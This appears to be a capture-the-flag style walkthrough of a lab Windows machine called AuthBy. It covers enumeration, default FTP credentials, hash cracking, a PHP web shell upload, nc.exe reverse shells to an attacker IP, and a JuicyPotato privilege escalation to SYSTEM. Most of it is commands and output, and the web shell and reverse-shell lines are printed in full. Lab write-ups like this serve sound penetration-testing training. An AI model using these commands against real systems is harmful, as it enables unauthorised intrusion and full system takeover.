##### Tags: `ftp`  `cmd shell`  `SeImpersonatePrivilege`  `CLSID`  `juicypotato`  `x86`

# 🪟 AuthBy 🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.103.46

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           zFTPServer 6.0 build 2011-10-17
242/tcp  open  http          Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
3145/tcp open  zftp-admin    zFTPServer admin
3389/tcp open  ms-wbt-server Microsoft Terminal Service
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
port 3145, 3389 unable to login  
port 21 ftp anonymous logged in successfully and found 3 users in accounts
```
$ ftp 192.168.103.46
Name (192.168.103.46:ming): anonymous
Password: 

----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
----------   1 root     root           25 Feb 10  2011 UninstallService.bat
----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
----------   1 root     root           17 Aug 13  2011 StopService.bat
----------   1 root     root           18 Aug 13  2011 StartService.bat
----------   1 root     root         8736 Nov 09  2011 Settings.ini
dr-xr-xr-x   1 root     root          512 Apr 02 18:35 log
----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
----------   1 root     root           23 Feb 10  2011 InstallService.bat
dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
dr-xr-xr-x   1 root     root          512 Oct 11 00:16 accounts
```
```console
ftp> ls
dr-xr-xr-x   1 root     root          512 Oct 11 00:16 backup
----------   1 root     root          764 Apr 02 18:30 acc[Offsec].uac
----------   1 root     root         1032 Apr 02 18:29 acc[anonymous].uac
----------   1 root     root          928 Apr 02 18:47 acc[admin].uac
```
```console
offsec
anonymous
admin
```
admin admin was able to login to ftp  
```console
$ ftp 192.168.103.46
Name (192.168.103.46:ming): admin
Password: admin

ftp> ls
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
```
found the password hash for offsec
```console
$ cat .htpasswd
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```
crack it and got the password
```console
$ john --show 1.txt                                     
offsec:elite
```
login to port 242 and found the index.php
```console
$ cat index.php
<center><pre>Qui e nuce nuculeum esse volt, frangit nucem!</pre></center>
```
we can upload a cmd shell and execute in the webpage
```console
$ cat shell.php             
<?php system($_REQUEST["cmd"]); ?>



ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||2081|)
150 File status okay; about to open data connection.
100% |*********************************************************************|    35       19.15 KiB/s    00:00 ETA
```
confirmed we have RCE
```console
http://192.168.103.46:242/shell.php?cmd=whoami

livda\apache
```
got the reverse shell
```console
192.168.103.46:242/shell.php?cmd=nc.exe -e cmd.exe 192.168.45.152 3389

$ penelope -p 3389
[+] Listening for reverse shells on 0.0.0.0:3389 →  127.0.0.1 • 10.0.2.15 • 192.168.45.152
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from  192.168.103.46 WINDOWS 👤 livda\apache • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/192.168.103.46-WINDOWS/2026_04_02-23_18_37-053.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\wamp\www>whoami
livda\apache
```
## Privilege Escalation
we have SeImpersonatePrivilege
but the system is x86
```console
C:\Users\apache\Downloads>whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


System Type:               X86-based PC
```
we have to use juicypotato x86  
found the CLSID number
```console
C:\Users\apache\Downloads>reg query HKCR\CLSID /s /f LocalService

HKEY_CLASSES_ROOT\CLSID\{8BC3F05E-D86B-11D0-A075-00C04FB68820}
    LocalService    REG_SZ    winmgmt

HKEY_CLASSES_ROOT\CLSID\{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
    LocalService    REG_SZ    winmgmt
```
upload juicepotato x86 and nc.exe
```console
C:\Users\apache\Downloads>jp32.exe -l 1632 -p c:\windows\system32\cmd.exe -a "/c c:\Users\apache\Downloads\nc.exe -e cmd.exe 192.168.45.152 21" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
jp32.exe -l 1632 -p c:\windows\system32\cmd.exe -a "/c c:\Users\apache\Downloads\nc.exe -e cmd.exe 192.168.45.152 21" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
Testing {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 1632
....
[+] authresult 0
{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\SYSTEM
```
got the system shell
```console
$ penelope -p 21
[+] Listening for reverse shells on 0.0.0.0:21 →  127.0.0.1 • 10.0.2.15 • 192.168.45.152
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from  192.168.103.46 WINDOWS 👤 nt authority\system • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/192.168.103.46-WINDOWS/2026_04_03-00_10_15-073.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>whoami

nt authority\system
```
